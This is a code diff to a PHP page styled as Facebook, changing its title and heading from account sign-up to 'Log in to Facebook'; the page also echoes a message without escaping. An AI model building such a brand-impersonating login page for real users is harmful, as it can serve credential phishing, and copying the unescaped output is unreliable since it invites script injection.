@@ -61,7 +61,7 @@ $con->close();
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Sign up for Facebook</title>
+  <title>Login into Facebook</title>
   <link rel="icon" href="fb.png"/>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
@@ -114,7 +114,7 @@ $con->close();
 <div class="container d-flex justify-content-center align-items-center flex-grow-1 py-5">
   <div class="register-box">
     <div class="logo">facebook</div>
-    <h2 class="fs-5 mb-3">Create a new account</h2>
+    <h2 class="fs-5 mb-3">Log in to Facebook</h2>
 
     <?php if (!empty($message)): ?>
       <div class="alert alert-info"><?= $message ?></div>
